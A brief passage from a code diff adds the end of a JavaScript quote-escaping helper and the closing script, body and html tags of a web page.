+        return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"');
+      }
+    </script>
+  </body>
 </html>
